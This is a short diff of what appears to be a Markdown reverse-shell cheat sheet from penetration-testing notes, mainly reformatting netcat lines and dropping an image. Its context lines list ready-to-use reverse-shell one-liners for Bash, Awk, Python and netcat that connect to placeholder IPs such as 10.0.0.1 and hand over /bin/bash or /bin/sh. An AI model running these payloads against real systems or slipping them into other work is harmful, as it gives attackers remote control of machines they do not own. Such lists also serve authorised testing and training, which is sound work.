@@ -14,10 +14,6 @@ nc -u -lvp 4242
 
 ## Bash/Linux
 
-
-
-![](../.gitbook/assets/image%20%284%29.png)
-
 * shell script : `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
 * Awk : `awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
 * Ncat :
@@ -26,8 +22,8 @@ nc -u -lvp 4242
 * Python : 
   * `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
 * Netcat :
-  * nc -e /bin/bash 10.0.0.1 1234
-  * nc -c /bin/sh 10.0.0.1 1234
+  * `nc -e /bin/bash 10.0.0.1 1234`
+  * `nc -c /bin/sh 10.0.0.1 1234`
 
 ## PHP
 
